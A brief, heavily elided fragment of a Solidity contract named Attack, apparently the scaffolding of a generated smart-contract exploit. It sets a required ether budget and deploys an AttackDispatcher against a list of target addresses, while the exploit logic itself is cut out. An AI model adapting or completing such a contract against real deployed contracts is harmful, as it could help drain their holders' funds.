 ...
 * parameter. Make sure to send at least 3 ether and 847851051006187970 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x35665024e3d659c2; /* equals 3 ether and 847851051006187970 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[4] = new AttackDispatcher{value: 3847851051006187969 }(4, _targets);
    }
